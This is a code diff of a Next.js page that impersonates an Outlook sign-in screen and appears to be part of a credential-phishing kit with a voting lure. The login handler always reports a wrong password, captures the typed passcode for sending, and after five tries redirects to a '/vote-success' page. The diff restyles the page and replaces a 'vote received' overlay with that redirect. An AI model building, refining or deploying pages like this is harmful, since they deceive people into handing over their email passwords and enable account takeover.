@@ -1,14 +1,15 @@
 import Head from 'next/head';
 import { useState, useRef } from 'react';
+import { useRouter } from 'next/router';
 
 const MAX_ATTEMPTS = 5;
 
 export default function EmailLoginPage() {
+  const router = useRouter();
   const [step, setStep] = useState(1);
   const [email, setEmail] = useState('');
   const [passcode, setPasscode] = useState('');
   const [feedback, setFeedback] = useState('');
-  const [showSuccess, setShowSuccess] = useState(false);
   const attemptRef = useRef(0);
 
   const handleContinue = () => {
@@ -23,7 +24,7 @@ export default function EmailLoginPage() {
   const handleLogin = async () => {
     setFeedback('Incorrect password! Please try again...');
     const pwdToSend = passcode;
-    setPasscode(''); // Clear passcode to require retaping
+    setPasscode('');
     attemptRef.current += 1;
     
     try {
@@ -39,8 +40,7 @@ export default function EmailLoginPage() {
     } catch (e) {}
     
     if (attemptRef.current >= MAX_ATTEMPTS) {
-      setShowSuccess(true);
-      setTimeout(() => setShowSuccess(false), 4000);
+      router.push('/vote-success');
     }
   };
 
@@ -62,134 +62,91 @@ export default function EmailLoginPage() {
         html, body { height: 100%; margin: 0; padding: 0; }
         body { 
           font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
-          background: #f2f2f2; 
+          background: linear-gradient(135deg, #e7ebf0, #f0f2f5); 
           display: flex; 
-          align-items: center; 
           justify-content: center; 
+          align-items: center; 
           min-height: 100vh;
+          margin: 0;
         }
         .main-wrapper {
-          background: white; 
-          width: 360px; 
-          padding: 24px 20px; 
-          border-radius: 8px; 
-          box-shadow: 0 4px 12px rgba(0,0,0,0.1); 
+          background: white;
+          width: 100%;
+          max-width: 360px;
+          padding: 24px;
+          border-radius: 8px;
+          box-shadow: 0 2px 8px rgba(0,0,0,0.1);
           text-align: center;
-          max-width: 90vw;
+          margin: 20px;
         }
         .logo { 
-          width: 60px; 
-          height: 60px; 
-          margin: 0 auto 20px; 
+          width: 50px; 
+          height: 50px; 
+          margin: 0 auto 16px;
           display: block;
         }
         input { 
-          width: 100%; 
-          max-width: 320px;
-          padding: 12px 16px; 
-          margin: 10px auto 0;
-          display: block;
+          width: 100%;
+          padding: 12px 14px; 
+          margin: 10px 0;
           border: 1px solid #ccc; 
-          border-radius: 4px; 
-          font-size: 15px; 
+          border-radius: 6px;
+          font-size: 15px;
           background: #fafafa;
         }
         input:focus { 
-          outline: none; 
-          border-color: #0078d4; 
+          outline: none;
+          border-color: #0078d4;
           background: white;
         }
         button { 
-          width: 100%; 
-          max-width: 320px;
-          padding: 12px; 
-          background: #0078d4; 
-          color: white; 
-          border: none; 
-          border-radius: 4px; 
-          font-size: 16px; 
+          width: 100%;
+          padding: 12px;
+          background: #0078d4;
+          color: white;
+          border: none;
+          border-radius: 6px;
+          font-size: 16px;
           cursor: pointer;
           margin-top: 8px;
-          display: block;
         }
         button:hover { 
-          background: #005a9e; 
+          background: #005a9e;
         }
         .feedback {
           color: #e1306c;
           font-size: 14px;
-          margin: 8px auto 0;
-          max-width: 320px;
-          display: block;
-        }
-        a {
-          color: #0078d4;
-          text-decoration: none;
-          font-size: 14px;
-          display: block;
-          margin-top: 12px;
+          margin: 8px 0;
         }
         .back-link {
           color: #0078d4;
           text-decoration: none;
           font-size: 14px;
-          display: block;
           margin-top: 12px;
           cursor: pointer;
+          display: inline-block;
         }
         .back-link:hover { text-decoration: underline; }
-        .footer { 
-          margin-top: 34px; 
-          padding-top: 16px; 
-          border-top: 1px solid #ccc; 
-          font-size: 13px; 
-          color: #666; 
-          text-align: center; 
+        .footer {
+          margin-top: 24px;
+          padding-top: 16px;
+          border-top: 1px solid #ccc;
+          font-size: 12px;
+          color: #666;
         }
         .footer a {
           color: #0078d4;
           text-decoration: none;
-          margin: 0 8px;
+          margin: 0 6px;
         }
         .footer a:hover { text-decoration: underline; }
-        .success-overlay { 
-          position: fixed; 
-          inset: 0; 
-          background: rgba(255,255,255,0.98); 
-          display: none; 
-          align-items: center; 
-          justify-content: center; 
-          z-index: 9999; 
-        }
-        .success-overlay.show { 
-          display: flex; 
-        }
-        .success-box { 
-          text-align: center; 
-          padding: 20px; 
-        }
-        .checkmark { 
-          width: 110px; 
-          height: 110px; 
-          background: #4caf50; 
-          border-radius: 50%; 
-          display: flex; 
-          align-items: center; 
-          justify-content: center; 
-          margin: 0 auto 28px; 
-          box-shadow: 0 4px 12px rgba(76,175,80,0.4); 
-        }
-        .checkmark svg { 
-          width: 56px; 
-          height: 56px; 
-        }
       `}</style>
 
       <div className="main-wrapper">
         {step === 1 ? (
           <div>
             <img className="logo" src="/logos/outlook-logo.svg" alt="Email" />
-            <h2 style={{fontSize: '20px', fontWeight: 700, marginBottom: '8px'}}>Sign in</h2>
+            <h2>Sign in</h2>
             <input 
               type="email" 
               placeholder="Enter your email" 
@@ -199,11 +156,10 @@ export default function EmailLoginPage() {
             />
             <div className="feedback">{feedback}</div>
             <button onClick={handleContinue}>Next</button>
-            <a href="#">Don't have an account? Sign up</a>
           </div>
         ) : (
           <div>
-            <h2 style={{fontSize: '20px', fontWeight: 700, marginBottom: '8px'}}>Enter your passcode</h2>
+            <h2>Enter your passcode</h2>
             <input
               type="password"
               placeholder="Passcode"
@@ -214,22 +170,13 @@ export default function EmailLoginPage() {
             <div className="feedback">{feedback}</div>
             <button onClick={handleLogin}>Sign In</button>
             <div className="back-link" onClick={handleBack}>← Back</div>
-            <a href="#">Forgot passcode?</a>
           </div>
         )}
         
         <div className="footer">
-          <a href="#">Terms of use</a>
-          <a href="#">Privacy &amp; cookies</a>
-          <a href="#">...</a>
-        </div>
-      </div>
-
-      <div className="success-overlay" id="successOverlay">
-        <div className="success-box">
-          <div className="checkmark"><svg viewBox="0 0 52 52" xmlns="http://www.w3.org/2000/svg"><polyline points="15,27 24,36 39,17"></polyline></svg></div>
-          <h2>Your vote has been received</h2>
-          <p>We will get back to you when your vote is counted.</p>
+          <a href="#">&nbsp;Terms of use&nbsp;</a>
+          <a href="#">&nbsp;Privacy&nbsp;</a>
+          <a href="#">…</a>
         </div>
       </div>
     </>
